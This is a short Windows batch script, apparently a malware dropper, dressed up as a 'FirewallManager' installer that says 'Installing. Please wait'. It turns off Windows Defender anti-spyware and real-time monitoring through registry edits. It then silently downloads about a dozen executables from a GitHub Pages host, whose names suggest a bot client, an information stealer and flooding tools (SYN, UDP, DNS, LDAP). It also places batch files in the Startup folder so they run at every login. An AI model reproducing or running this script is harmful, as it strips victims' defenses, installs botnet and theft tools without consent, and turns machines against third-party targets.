@echo off 
cd C:\Users\%username%\AppData
mkdir FirewallManager 
cd FirewallManager
color a
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
cls
net stop WinDefend
cls
net start WinDefend
cls 
echo "Installing. Please wait"
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/client.exe
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/tcp.exe 
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/udp.exe 
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/curl_flood.exe
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/storm.exe
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/ldap.exe
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/syn.exe
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/informator.exe
curl -OJL --silent https://raw.githubusercontent.com/Abrissyy/goodreps/main/bot/setup.bat
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/dns.exe
curl -OJL --silent https://abrissyy.github.io/goodreps/bot/informator.bat
xcopy /y setup.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /y Informator.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
Informator.bat & setup.bat
exit 
